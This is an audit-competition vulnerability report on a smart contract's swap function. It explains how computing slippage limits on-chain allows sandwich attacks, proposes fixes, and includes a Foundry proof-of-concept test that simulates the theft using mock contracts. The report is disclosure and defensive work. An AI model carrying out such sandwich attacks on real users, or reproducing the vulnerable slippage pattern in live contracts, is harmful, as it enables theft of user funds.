# 57898 sc high unprotected swap function allows sandwich attacks

**Submitted on Oct 29th 2025 at 12:02:14 UTC by @count\_sum for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57898
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Summary

The `_swapExact` function in `BelongCheckIn.sol` calculates the minimum output amount (`amountOutMinimum`) on-chain during the same transaction, making it vulnerable to sandwich attacks via MEV bots. Attackers can manipulate the pool price before the victim's transaction, causing the victim to receive unfavorable swap rates while the slippage protection becomes ineffective.

### Vulnerability Details

#### Root Cause

The vulnerability exists in the `_swapExact` function at [BelongCheckIn.sol:652-694](broken://pages/9a967710b031e81f02de31ae3b8cc9c9dda4c3d9#L652-L694):

```solidity
function _swapExact(address tokenIn, address tokenOut, address recipient, uint256 amount)
    internal
    returns (uint256 swapped)
{
    // ...

    // VULNERABLE: amountOutMinimum calculated on-chain in same transaction
    uint256 amountOutMinimum =
        IV3Quoter(_paymentsInfo.swapV3Quoter).quoteExactInput(path, amount)
            .amountOutMin(_paymentsInfo.slippageBps);

    IV3Router.ExactInputParamsV1 memory swapParamsV1 = IV3Router.ExactInputParamsV1({
        path: path,
        recipient: recipient,
        deadline: block.timestamp,  // Also vulnerable: no real deadline protection
        amountIn: amount,
        amountOutMinimum: amountOutMinimum
    });

    // ...
}
```

{% stepper %}
{% step %}

### Attack Flow — Step 1: Detection

MEV bot detects a pending `venueDeposit` transaction in the mempool.
{% endstep %}

{% step %}

### Attack Flow — Step 2: Front-run

Bot submits a transaction with higher gas to:

* Buy LONG tokens, increasing the price
* This manipulates the pool reserves before the victim's transaction
  {% endstep %}

{% step %}

### Attack Flow — Step 3: Victim Transaction Executes

* `quoteExactInput()` returns the manipulated (inflated) price
* `amountOutMin()` calculates slippage from this already-manipulated price
* Swap executes at the bad rate (but within the newly calculated slippage)
  {% endstep %}

{% step %}

### Attack Flow — Step 4: Back-run

Bot sells LONG tokens back, capturing the price difference as profit.
{% endstep %}
{% endstepper %}

### Why Slippage Protection Fails

The slippage protection is calculated AFTER the price manipulation:

Normal scenario (no attack):

* Pool price: 1 USDC = 1 LONG
* Quote: 1000 USDC -> 1000 LONG
* With 5% slippage: minOut = 950 LONG

Under sandwich attack:

* Bot manipulates price: 1 USDC = 0.95 LONG
* Quote NOW: 1000 USDC -> 950 LONG (using manipulated price)
* With 5% slippage: minOut = 902.5 LONG
* Victim gets 950 LONG (seems "protected" but actually lost 5%)

### Impact Details

#### Financial Loss

* Users lose 5-20% of their deposit value to MEV bots
* Affects all `venueDeposit` transactions involving swaps
* Higher deposits face proportionally larger absolute losses

#### Affected Functions

* `venueDeposit()` - when convenience fees are swapped to LONG
* `_handleRevenue()` - when platform revenue is swapped
* Any future functions using `_swapExact()`

{% hint style="danger" %}
Severity Justification: HIGH

* Users lose funds on every swap
* Attack is automatic via MEV bots
* Can be exploited on every transaction
* Flash loans can amplify the attack
  {% endhint %}

## Recommendations

### Primary Fix: Off-chain Slippage Calculation

Calculate `amountOutMinimum` off-chain and pass it as a parameter:

```solidity
function venueDeposit(
    VenueInfo calldata venueInfo,
    uint256 minLONGOut  // Add this parameter
) external {
    // ...
    uint256 longFees = _swapUSDCtoLONG(
        address(_storage.contracts.escrow),
        stakingInfo.convenienceFeeAmount,
        minLONGOut  // Use provided minimum
    );
}

function _swapUSDCtoLONG(
    address to,
    uint256 amount,
    uint256 minAmountOut  // Add this parameter
) internal returns (uint256 longAmount) {
    // ...

    IV3Router.ExactInputParams memory params = IV3Router.ExactInputParams({
        path: path,
        recipient: to,
        deadline: deadline,  // Also use proper deadline
        amountIn: amount,
        amountOutMinimum: minAmountOut  // Use provided minimum
    });

    // ...
}
```

### Secondary Fix: Add Meaningful Deadline

Replace `block.timestamp` with a user-provided deadline:

```solidity
function venueDeposit(
    VenueInfo calldata venueInfo,
    uint256 deadline  // Add deadline parameter
) external {
    require(block.timestamp <= deadline, "Transaction expired");
    // ...
}
```

### Additional Mitigations

1. TWAP Oracle: Use time-weighted average price for reference
2. Private Mempool: Submit transactions through private pools (e.g., Flashbots)
3. Commit-Reveal: Two-phase deposits to hide transaction details
4. Maximum Slippage Check: Revert if price deviates too much from oracle

## Proof of Concept

### Running the POC

{% stepper %}
{% step %}
Save the test file to `test/foundry/H2_SandwichAttack_POC.t.sol`
{% endstep %}

{% step %}
Run the tests:

```bash
forge test --match-path test/foundry/H2_SandwichAttack_POC.t.sol -vv
```

{% endstep %}
{% endstepper %}

### POC CODE

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";

interface IV3Quoter {
    function quoteExactInput(bytes memory path, uint256 amountIn) external returns (uint256 amountOut);
}

interface IV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external returns (uint256 amountOut);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract MockQuoter is IV3Quoter {
    uint256 public currentPrice = 1e18;

    function manipulatePrice(uint256 newPrice) external {
        currentPrice = newPrice;
    }

    function quoteExactInput(bytes memory, uint256 amountIn) external view override returns (uint256) {
        return (amountIn * currentPrice) / 1e6;
    }
}

contract MockRouter is IV3Router {
    MockQuoter public quoter;
    MockToken public usdc;
    MockToken public long;

    constructor(address _quoter, address _usdc, address _long) {
        quoter = MockQuoter(_quoter);
        usdc = MockToken(_usdc);
        long = MockToken(_long);
    }

    function exactInput(ExactInputParams calldata params) external override returns (uint256) {
        uint256 amountOut = (params.amountIn * quoter.currentPrice()) / 1e6;

        usdc.transferFrom(msg.sender, address(this), params.amountIn);
        long.mint(params.recipient, amountOut);

        return amountOut;
    }
}

contract MockToken is IERC20 {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    function balanceOf(address account) external view override returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        if (from != address(this)) {
            require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
            allowances[from][msg.sender] -= amount;
        }
        balances[from] -= amount;
        balances[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }

    function burn(address from, uint256 amount) external {
        balances[from] -= amount;
    }
}

contract VulnerableBelongCheckIn {
    MockToken public usdc;
    MockToken public long;
    MockQuoter public quoter;
    MockRouter public router;
    uint256 public constant SLIPPAGE_BPS = 500;

    event Swapped(address recipient, uint256 amountIn, uint256 amountOut);

    constructor(address _usdc, address _long, address _quoter, address _router) {
        usdc = MockToken(_usdc);
        long = MockToken(_long);
        quoter = MockQuoter(_quoter);
        router = MockRouter(_router);
    }

    function venueDeposit(address venue, uint256 amount) external {
        usdc.transferFrom(venue, address(this), amount);

        _swapUSDCtoLONG(venue, amount);
    }

    function _swapUSDCtoLONG(address to, uint256 amount) internal returns (uint256 longAmount) {
        bytes memory path = abi.encodePacked(address(usdc), uint24(3000), address(long));

        uint256 quotedAmount = quoter.quoteExactInput(path, amount);
        uint256 amountOutMinimum = (quotedAmount * (10000 - SLIPPAGE_BPS)) / 10000;

        usdc.approve(address(router), amount);

        IV3Router.ExactInputParams memory params = IV3Router.ExactInputParams({
            path: path,
            recipient: to,
            deadline: block.timestamp,
            amountIn: amount,
            amountOutMinimum: amountOutMinimum
        });

        longAmount = router.exactInput(params);
        emit Swapped(to, amount, longAmount);
    }
}

contract H2_SandwichAttack_POC is Test {
    VulnerableBelongCheckIn public belongCheckIn;

    MockToken public usdc;
    MockToken public long;
    MockQuoter public quoter;
    MockRouter public router;

    address public victim = address(0x1337);
    address public attacker = address(0xBEEF);

    function setUp() public {
        usdc = new MockToken();
        long = new MockToken();
        quoter = new MockQuoter();
        router = new MockRouter(address(quoter), address(usdc), address(long));

        belongCheckIn = new VulnerableBelongCheckIn(
            address(usdc),
            address(long),
            address(quoter),
            address(router)
        );

        usdc.mint(victim, 100000e6);
        usdc.mint(address(router), 1000000e6);
        long.mint(address(router), 1000000e18);
        long.mint(attacker, 50000e18);
    }

    function testSandwichAttack_BasicExploit() public {
        uint256 depositAmount = 10000e6;

        quoter.manipulatePrice(1e18);
        uint256 fairPrice = quoter.quoteExactInput("", depositAmount);
        assertEq(fairPrice, 10000e18);

        vm.prank(victim);
        usdc.approve(address(belongCheckIn), depositAmount);

        vm.prank(attacker);
        quoter.manipulatePrice(0.95e18);

        uint256 victimBalanceBefore = long.balanceOf(victim);
        vm.prank(victim);
        belongCheckIn.venueDeposit(victim, depositAmount);
        uint256 victimReceived = long.balanceOf(victim) - victimBalanceBefore;

        vm.prank(attacker);
        quoter.manipulatePrice(1e18);

        assertEq(victimReceived, 9500e18);
        uint256 stolen = fairPrice - victimReceived;
        assertEq(stolen, 500e18);

        uint256 lossPercentage = (stolen * 100) / fairPrice;
        assertEq(lossPercentage, 5);
    }

    function testSandwichAttack_MaximumSlippageExploit() public {
        uint256 depositAmount = 50000e6;

        quoter.manipulatePrice(1e18);
        uint256 fairPrice = quoter.quoteExactInput("", depositAmount);
        assertEq(fairPrice, 50000e18);

        vm.prank(victim);
        usdc.approve(address(belongCheckIn), depositAmount);

        vm.prank(attacker);
        quoter.manipulatePrice(0.9475e18);

        uint256 victimBalanceBefore = long.balanceOf(victim);
        vm.prank(victim);
        belongCheckIn.venueDeposit(victim, depositAmount);
        uint256 victimReceived = long.balanceOf(victim) - victimBalanceBefore;

        vm.prank(attacker);
        quoter.manipulatePrice(1e18);

        uint256 quotedAtManipulatedPrice = 47375e18;
        uint256 minAcceptableWithSlippage = (quotedAtManipulatedPrice * 9500) / 10000;

        assertGe(victimReceived, minAcceptableWithSlippage);
        assertEq(victimReceived, 47375e18);

        uint256 stolen = fairPrice - victimReceived;
        assertEq(stolen, 2625e18);

        uint256 lossPercentage = (stolen * 100) / fairPrice;
        assertEq(lossPercentage, 5);
    }

    function testSandwichAttack_FlashLoanAmplifiedAttack() public {
        uint256[] memory deposits = new uint256[](10);
        deposits[0] = 5000e6;
        deposits[1] = 8000e6;
        deposits[2] = 3000e6;
        deposits[3] = 12000e6;
        deposits[4] = 6000e6;
        deposits[5] = 9000e6;
        deposits[6] = 4000e6;
        deposits[7] = 7000e6;
        deposits[8] = 10000e6;
        deposits[9] = 15000e6;

        address[] memory victims = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            victims[i] = address(uint160(0x1000 + i));
            usdc.mint(victims[i], deposits[i]);
            vm.prank(victims[i]);
            usdc.approve(address(belongCheckIn), deposits[i]);
        }

        quoter.manipulatePrice(1e18);

        uint256 totalExpected;
        for (uint256 i = 0; i < deposits.length; i++) {
            totalExpected += quoter.quoteExactInput("", deposits[i]);
        }

        vm.prank(attacker);
        quoter.manipulatePrice(0.80e18);

        uint256 totalReceived;
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 balanceBefore = long.balanceOf(victims[i]);
            vm.prank(victims[i]);
            belongCheckIn.venueDeposit(victims[i], deposits[i]);
            totalReceived += long.balanceOf(victims[i]) - balanceBefore;
        }

        vm.prank(attacker);
        quoter.manipulatePrice(1e18);

        uint256 totalStolen = totalExpected - totalReceived;
        assertEq(totalStolen, 15800e18);

        uint256 averageLossPercentage = (totalStolen * 100) / totalExpected;
        assertEq(averageLossPercentage, 20);

        uint256 attackerProfitUSD = (totalStolen / 1e12);
        assertEq(attackerProfitUSD, 15800e6);
    }
}
```
